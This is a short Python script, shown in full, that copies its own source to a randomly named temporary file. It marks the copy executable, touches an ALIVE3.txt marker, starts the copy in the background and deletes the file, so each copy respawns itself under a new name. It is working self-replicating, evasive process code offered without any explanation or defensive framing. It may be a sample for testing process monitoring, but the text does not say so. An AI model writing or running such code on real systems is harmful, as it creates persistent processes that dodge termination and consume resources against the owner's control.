#!/usr/bin/python

import os
import sys
import time
import shutil
import random
import tempfile

f = open(sys.argv[0])
code = f.read()
f.close()
time.sleep(1)

def getRandomFilename():
  size = random.randint(4,10)
  pre = ""
  for i in range(size):
    pre = pre + random.choice("abcdefghijk")
  b = bytearray(pre)
  b[1]='A'
  b[3]='Y'
  pre = str(b)
  return tempfile.mktemp(prefix=pre)


tempname = getRandomFilename()
g = open(tempname, "w")
g.write(code)
g.close()
os.chmod(tempname, 0555)
os.system("touch ALIVE3.txt")
os.system("%s &" % (tempname))
time.sleep(1)
os.remove(tempname)
